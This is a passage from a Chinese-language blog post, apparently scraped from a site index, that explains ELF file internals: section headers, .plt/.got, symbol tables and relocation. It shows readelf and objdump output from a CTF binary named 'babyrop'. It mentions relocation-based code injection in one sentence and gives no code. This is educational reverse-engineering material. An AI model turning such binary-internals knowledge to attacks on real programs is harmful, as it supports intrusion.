DT_PLTGOT：全局偏移表（GOT）的地址 重定位条目的相关信息 DT_SYMTAB：动态符号表的地址，对应.dynsym节 DT_HASH：符号散列表的地址，对应.hash节 DT_STRTAB：符号字符串表的地址，对应.dynstr节 \u0026hellip; PT_NOTE 特定供应商/系统相关的附加信息\n实际上这一段只保存了操作系统的规范信息，在运行的时候是不需要它的\n还有一种note段的攻击，但作者实在是没找到相关资料，如果各位读者有相关资料可以参考，烦请在评论区给出链接，感谢您的付出！\nPT_INTERP 对程序解释器位置的描述，如，/lib/linux-ld.so.2一般指动态连接器的位置，也即程序解释器的位置（.so.2文件不是.so文件）\nPT_PHDR 保存了程序头表本身的位置和大小，phdr为program header的缩写\nELF节头（section header） 我们可以使用readelf -S命令查看节头表：\n$ readelf -S babyrop There are 31 section headers, starting at offset 0x1a70: 节头： [号] 名称 类型 地址 偏移量 大小 全体大小 旗标 链接 信息 对齐 [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000400238 00000238 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 00000254 0000000000000020 0000000000000000 A 0 0 4 [ 3] .note.gnu.bu[...] NOTE 0000000000400274 00000274 0000000000000024 0000000000000000 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 00000298 000000000000001c 0000000000000000 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 000002b8 0000000000000090 0000000000000018 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400348 00000348 000000000000005f 0000000000000000 A 0 0 1 [ 7] .gnu.version VERSYM 00000000004003a8 000003a8 000000000000000c 0000000000000002 A 5 0 2 [ 8] .gnu.version_r VERNEED 00000000004003b8 000003b8 0000000000000030 0000000000000000 A 6 1 8 [ 9] .rela.dyn RELA 00000000004003e8 000003e8 0000000000000018 0000000000000018 A 5 0 8 [10] .rela.plt RELA 0000000000400400 00000400 0000000000000060 0000000000000018 AI 5 24 8 [11] .init PROGBITS 0000000000400460 00000460 000000000000001a 0000000000000000 AX 0 0 4 [12] .plt PROGBITS 0000000000400480 00000480 0000000000000050 0000000000000010 AX 0 0 16 [13] .plt.got PROGBITS 00000000004004d0 000004d0 0000000000000008 0000000000000000 AX 0 0 8 [14] .text PROGBITS 00000000004004e0 000004e0 00000000000001b2 0000000000000000 AX 0 0 16 [15] .fini PROGBITS 0000000000400694 00000694 0000000000000009 0000000000000000 AX 0 0 4 [16] .rodata PROGBITS 00000000004006a0 000006a0 0000000000000047 0000000000000000 A 0 0 8 [17] .eh_frame_hdr PROGBITS 00000000004006e8 000006e8 0000000000000034 0000000000000000 A 0 0 4 [18] .eh_frame PROGBITS 0000000000400720 00000720 00000000000000f4 0000000000000000 A 0 0 8 [19] .init_array INIT_ARRAY 0000000000600e10 00000e10 0000000000000008 0000000000000000 WA 0 0 8 [20] .fini_array FINI_ARRAY 0000000000600e18 00000e18 0000000000000008 0000000000000000 WA 0 0 8 [21] .jcr PROGBITS 0000000000600e20 00000e20 0000000000000008 0000000000000000 WA 0 0 8 [22] .dynamic DYNAMIC 0000000000600e28 00000e28 00000000000001d0 0000000000000010 WA 6 0 8 [23] .got PROGBITS 0000000000600ff8 00000ff8 0000000000000008 0000000000000008 WA 0 0 8 [24] .got.plt PROGBITS 0000000000601000 00001000 0000000000000038 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000601038 00001038 0000000000000018 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000601050 00001050 0000000000000008 0000000000000000 WA 0 0 1 [27] .comment PROGBITS 0000000000000000 00001050 0000000000000035 0000000000000001 MS 0 0 1 [28] .shstrtab STRTAB 0000000000000000 00001964 000000000000010c 0000000000000000 0 0 1 [29] .symtab SYMTAB 0000000000000000 00001088 0000000000000690 0000000000000018 30 47 8 [30] .strtab STRTAB 0000000000000000 00001718 000000000000024c 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) 这里面我们可以注意一下每个节的旗标（flag），如果被标记为A，那么说明该节会在程序运行时分配并装载进内存。有一些节在运行时不是必需的，就不会被装载。比如.symtab节，有时候为了节省空间会把它删掉\n段和节的区别 段是程序执行的必要组成部分 节是段中代码或数据的划分 段是房子的房间，节是房间中的屏风隔断\n而所谓节头表就是对这些节的位置和大小的描述（主要用于链接和调试，没有它程序可以正常运行）\n节头 如果程序中缺少了节头，并不意味着节消失了；就好像电话簿上某人的号码消失了，并不代表某人的号码不存在了。我们只是不能再通过节头引用节了而已 因此，我们可以人为地删除节头，程序仍然可以正常运行 但是如果没有节头，gdb和objdump这种工具就没用了\n.text节 保存了程序代码指令，一般存在text段中\n.rodata节 rodata为read-only data的缩写，意为只读数据，这个节因为数据只读，因此不存在data段中，而是在text段中\n.data节 .data节保存了初始化的全局变量等数据，存在data段中\n.bss节 .bss节中保存了\n未初始化的全局变量和静态变量 在代码中没有明确初始化的全局变量和静态变量 它存在data段中，一般来说它会被初始化为0，但是在运行期间它的值是可能改变的\n它为什么被称为bss呢？请看下图：\nbss原本是指 block storage start 块状存储起点（渣翻请勿在意），但是为了和.data节区分，可以记作 better save space 更优保存空间\n可以参考这篇博文\n.plt节 plt表，意为procedure linkage table 过程链接表，包含了动态链接器调用从共享库导入的函数所必需的相关代码，保存在text段中\n.got与.got.plt节 got意为Global Offsets Table，保存了全局偏移表，保存在text段中，和.plt节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。\n.got和.plt的关系类似于：\n.got中存储的是一块空间的地址，这块空间中一开始保存了一个offset用于与.plt中的地址进行计算得到真实地址，然后就会把这个真实地址存入.got指向的那块空间之中\nGot.plt is actually smaller subset of the .got section. Think of pointing to the tail end of an array of slots. Conceptually it sort of looks like this\nint[10] got; int* gotplt = \u0026amp;got[5]; 而.got.plt节是.got的一个子集，\nGot section basically can contain addresses of Global variables and functions. All the global variables are in the first couple of slots and suffix is all pointers to functions. gotplt is the first slot .got that contains only the addresses of function.\n.got表中包含了全局变量和函数的地址，但.got.plt中只有函数\nEventually after function addresses are resolved via means of plt. The resolved address goes into .gotplt which btw is inside .got as I mentioned earlier.\n最终由于.plt表的存在，运行的时候.got.plt中的地址会被转化，而这个.got.plt仍然在.got中\n更多请查看此问题\n为什么有了.plt还要有.got呢？ 因为单纯由plt表没法找到函数的真实地址，我们需要通过got表才能真正地调用函数。\n既然如此，为什么不一开始就保存函数的真实地址呢？\n因为动态链接器采用默认的延迟链接方式时，不会在第一次调用时就对地址进行解析，这样可以提高装载时的性能\ngot表的结构 .ctors和.dtors节 ctors -\u0026gt; Constructor 构造器，是在main函数之前需要执行的函数 dtors -\u0026gt; Destructor 析构器，是在main函数之后需要执行的函数 它们保存了构造函数和析构函数的指针\nELF符号 符号是对某些类型的数据或者代码的符号引用，实际上就是一个结构体，可以用于链接、重定位、反汇编和调试\ntypedef struct elf64_sym { Elf64_Word st_name; /* 符号名称，字符串表中的索引 STT_OBJECT 表示符号关联到一个数据对象，如变量、数组或指针； STT_FUNC 表示符号关联到一个函数； STT_SECTION 表示符号关联到节 STT_NOTYPE 表示符号类型未指定，用于未定义引用 */ unsigned char st_info; /* 类型和绑定属性： STB_LOCAL 本地符号在目标文件之外时不可见的 STB_GLOBAL 对于所有要合并的目标文件都可见 STB_WEAK 类似于STB_GLOBAL，不过优先级较弱，可能会被为标记为STB_WEAK的同名符号覆盖 */ unsigned char st_other; // 语义未定义，0 Elf64_Half st_shndx; // 相关节的索引，符号将绑定到该节，此外SHN_ABS指定符号是绝对值，不因重定位而改变，SHN_UNDEF标识未定义符号。 Elf64_Addr st_value; // 符号的值 Elf64_Xword st_size; // 符号的长度，如一个指针的长度或struct对象中包含的字节数。 }Elf64_Sym; 我们可以使用readelf -s命令查看程序符号表：\n$ readelf -s babyrop Symbol table \u0026#39;.dynsym\u0026#39; contains 6 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.7 (3) Symbol table \u0026#39;.symtab\u0026#39; contains 70 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000400238 0 SECTION LOCAL DEFAULT 1 .interp 2: 0000000000400254 0 SECTION LOCAL DEFAULT 2 .note.ABI-tag 3: 0000000000400274 0 SECTION LOCAL DEFAULT 3 .note.gnu.build-id 4: 0000000000400298 0 SECTION LOCAL DEFAULT 4 .gnu.hash 5: 00000000004002b8 0 SECTION LOCAL DEFAULT 5 .dynsym 6: 0000000000400348 0 SECTION LOCAL DEFAULT 6 .dynstr 7: 00000000004003a8 0 SECTION LOCAL DEFAULT 7 .gnu.version 8: 00000000004003b8 0 SECTION LOCAL DEFAULT 8 .gnu.version_r 9: 00000000004003e8 0 SECTION LOCAL DEFAULT 9 .rela.dyn 10: 0000000000400400 0 SECTION LOCAL DEFAULT 10 .rela.plt 11: 0000000000400460 0 SECTION LOCAL DEFAULT 11 .init 12: 0000000000400480 0 SECTION LOCAL DEFAULT 12 .plt 13: 00000000004004d0 0 SECTION LOCAL DEFAULT 13 .plt.got 14: 00000000004004e0 0 SECTION LOCAL DEFAULT 14 .text 15: 0000000000400694 0 SECTION LOCAL DEFAULT 15 .fini 16: 00000000004006a0 0 SECTION LOCAL DEFAULT 16 .rodata 17: 00000000004006e8 0 SECTION LOCAL DEFAULT 17 .eh_frame_hdr 18: 0000000000400720 0 SECTION LOCAL DEFAULT 18 .eh_frame 19: 0000000000600e10 0 SECTION LOCAL DEFAULT 19 .init_array 20: 0000000000600e18 0 SECTION LOCAL DEFAULT 20 .fini_array 21: 0000000000600e20 0 SECTION LOCAL DEFAULT 21 .jcr 22: 0000000000600e28 0 SECTION LOCAL DEFAULT 22 .dynamic 23: 0000000000600ff8 0 SECTION LOCAL DEFAULT 23 .got 24: 0000000000601000 0 SECTION LOCAL DEFAULT 24 .got.plt 25: 0000000000601038 0 SECTION LOCAL DEFAULT 25 .data 26: 0000000000601050 0 SECTION LOCAL DEFAULT 26 .bss 27: 0000000000000000 0 SECTION LOCAL DEFAULT 27 .comment 28: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 29: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__ 30: 0000000000400510 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 31: 0000000000400550 0 FUNC LOCAL DEFAULT 14 register_tm_clones 32: 0000000000400590 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 33: 0000000000601050 1 OBJECT LOCAL DEFAULT 26 completed.7594 34: 0000000000600e18 0 OBJECT LOCAL DEFAULT 20 __do_global_dtor[...] 35: 00000000004005b0 0 FUNC LOCAL DEFAULT 14 frame_dummy 36: 0000000000600e10 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_in[...] 37: 0000000000000000 0 FILE LOCAL DEFAULT ABS babyrop.c 38: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 39: 0000000000400810 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__ 40: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_END__ 41: 0000000000000000 0 FILE LOCAL DEFAULT ABS 42: 0000000000600e18 0 NOTYPE LOCAL DEFAULT 19 __init_array_end 43: 0000000000600e28 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC 44: 0000000000600e10 0 NOTYPE LOCAL DEFAULT 19 __init_array_start 45: 00000000004006e8 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR 46: 0000000000601000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 47: 0000000000400690 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini 48: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 49: 0000000000601038 0 NOTYPE WEAK DEFAULT 25 data_start 50: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 25 _edata 51: 0000000000400694 0 FUNC GLOBAL DEFAULT 15 _fini 52: 0000000000000000 0 FUNC GLOBAL DEFAULT UND system@@GLIBC_2.2.5 53: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@@GLIBC_2.2.5 54: 0000000000601048 8 OBJECT GLOBAL DEFAULT 25 binsh 55: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_mai[...] 56: 0000000000601038 0 NOTYPE GLOBAL DEFAULT 25 __data_start 57: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 58: 0000000000601040 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 59: 00000000004006a0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 60: 0000000000400620 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init 61: 0000000000601058 0 NOTYPE GLOBAL DEFAULT 26 _end 62: 00000000004004e0 42 FUNC GLOBAL DEFAULT 14 _start 63: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 64: 00000000004005d6 69 FUNC GLOBAL DEFAULT 14 main 65: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses 66: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __isoc99_scanf@@[...] 67: 0000000000601050 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 68: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 69: 0000000000400460 0 FUNC GLOBAL DEFAULT 11 _init 我们可以看到.symtab节中保存了节、数据对象、包括main在内的函数等，这些对我们的调试、反汇编都是非常重要的。\n当我们使用objdump时，每一段代码前面会有一个标注，如下：\n$ objdump -d babyrop babyrop： 文件格式 elf64-x86-64 Disassembly of section .init: 0000000000400460 \u0026lt;_init\u0026gt;: 400460: 48 83 ec 08 sub $0x8,%rsp 400464: 48 8b 05 8d 0b 20 00 mov 0x200b8d(%rip),%rax # 600ff8 \u0026lt;__gmon_start__\u0026gt; 40046b: 48 85 c0 test %rax,%rax 40046e: 74 05 je 400475 \u0026lt;_init+0x15\u0026gt; 400470: e8 5b 00 00 00 call 4004d0 \u0026lt;__gmon_start__@plt\u0026gt; 400475: 48 83 c4 08 add $0x8,%rsp 400479: c3 ret ... 过程入口是每个函数的起点，因此通过检测过程序言（procedure prologue）可以帮助我们找到一个新韩淑的起始位置\n如果段是公司中不同的部门，节就是部门中的各小组，而符号表就是一张登记表，把各小组及其成员都登记在表上，如果没有符号表，老板就不知道谁是谁了\n.symtab节 保存了符号信息，用于调试和链接，保存了可执行文件的本地符号（全局变量、本地函数等）\n.symtab中保存了所有的符号，有很多都是很重要的，如果把他们去掉，虽然严格意义上不会妨碍程序的运行，但是对人来说就难读了很多\n.strtab节 保存了符号字符串表，该内容会被.symtab结构引用\n.dynsym节 dynsym，dynamic symbols，保存了从共享库导入的动态符号信息，保存在text段中\n它是 .symtab的子集，它只保存动态/全局符号\n与symtab不同的是，动态链接的二进制文件运行时不能缺少它；symtab可以删掉但它不能。但是如果是静态链接程序，用strip命令清理后就不会有符号表（dynsym也变成非必需的了）\n.dynstr节 保存了动态符号字符串表，就是动态符号的名字\n.rel.*节 rel-\u0026gt;reacation，重定位节，保存了重定位相关的信息，这些信息描述了如何在链接或运行过程中对部分内容或进程镜像进行补充或修改\n.hash节 保存了一个用于查找符号的哈希表（散列表）\n.shstrtab节 保存了节头字符串表，也就是每个节头的名字\nELF重定位 Relocation 重定位就是将符号定义和符号引用进行连接的过程。\n在重定位文件中，重定位记录保存了如何对给定的符号对应代码进行补充的相关信息，实际上是一种给二进制文件打补丁的机制。\n例如，1.o的代码中引用了2.o中的代码，当链接的时候就会对1.o中的重定位记录进行分析，目标文件中的代码会被重定位到可执行文件的段中一个给定的地址，符号引用被解析成了符号定义。\n对于共享库的函数，由于延迟链接，只有当一个函数真正被调用时，才会进行GOT重定位\n基于二进制修补的重定位代码注入 既然重定位是将符号引用实现的过程，那么我们可以更改可执行文件的符号表，让其指向我们给定的目标文件让其重定位，这样我们的代码就变成了可执行文件的一部分\n更多的资料敬请阅读Linux ELF 手册\n","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/elf%E8%AF%A6%E8%A7%A3/","section":"principle","summary":"Myths which are believed in tend to become true. — George Orwell ELF详解 什么是ELF 使用readelf命令读取elf文件 ELF文件类型 ELF程序头（描述段的头） PT_LOAD PT_DYNAMIC（动态","tags":["pwn","ELF"],"title":"ELF详解"},{"categories":null,"contents":"","date":"0001年01月01日","permalink":"https://peterliuzhi.top/homepage/","section":"","summary":"","tags":null,"title":""}]